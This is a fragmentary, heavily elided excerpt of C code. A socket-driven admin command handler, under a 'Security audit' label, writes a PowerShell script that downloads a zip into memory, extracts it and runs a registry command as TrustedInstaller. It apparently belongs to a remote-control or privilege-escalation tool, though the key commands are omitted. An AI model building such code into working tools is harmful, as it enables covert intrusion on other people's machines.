...
static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
    ...
    /* Security audit */
        ...
        if (f) {
            ...
            fprintf(f, "Write-Host '[STEP 3] Downloading zip into memory (no disk write)...'\n");
            ...
            fprintf(f, "    if (!(Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }\n");
            fprintf(f, "    $entryStream = $entry.Open()\n");
            fprintf(f, "    $fileStream = [System.IO.File]::OpenWrite($path)\n");
            ...
            fprintf(f, "    Write-Host '[STEP 11] Running registry command as TrustedInstaller...'\n");
            ...
            fprintf(f, "    Write-Host '[STEP 12] Registry command completed. Verifying...'\n");
